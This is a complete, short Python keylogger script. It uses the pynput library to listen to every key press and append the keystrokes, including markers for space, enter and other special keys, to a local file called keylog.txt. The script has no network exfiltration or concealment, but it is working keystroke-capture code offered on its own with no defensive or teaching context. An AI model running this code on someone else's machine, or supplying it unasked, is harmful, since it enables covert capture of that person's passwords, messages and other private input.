from pynput import keyboard

LOG_FILE = "keylog.txt"


def write_to_file(key):
    """Write a captured key to the local log file."""
    with open(LOG_FILE, "a", encoding="utf-8") as log_file:
        try:
            log_file.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            else:
                log_file.write(f"[{key}] ")


def on_press(key):
    """Handle a keyboard event by writing it to the log file."""
    write_to_file(key)


def main():
    """Start the keyboard listener and wait for captured input."""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
